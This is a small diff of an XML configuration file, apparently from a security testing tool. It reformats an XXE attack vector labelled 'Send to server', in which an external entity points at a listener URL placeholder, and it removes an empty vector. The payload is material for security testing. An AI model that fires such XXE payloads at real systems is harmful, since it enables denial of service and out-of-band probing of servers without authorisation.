@@ -9,12 +9,13 @@ However, conducting DoS attacks in such a manner is only applicable by making th
     <attackListenerURL>true</attackListenerURL>
 </params>
 <attackvectors>
-    <attackvector label="Send to server"><![CDATA[
-            <!DOCTYPE data [
-            <!ENTITY dos SYSTEM "§tf_listenURL§" >
-            ]>
-            <data>&dos;</data>]]>
+    <attackvector label="Send to server">
+<![CDATA[
+<!DOCTYPE data [
+<!ENTITY dos SYSTEM "§tf_listenURL§" >
+]>
+<data>&dos;</data>
+]]>
     </attackvector>
-    <attackvector></attackvector>
 </attackvectors>
 </config>
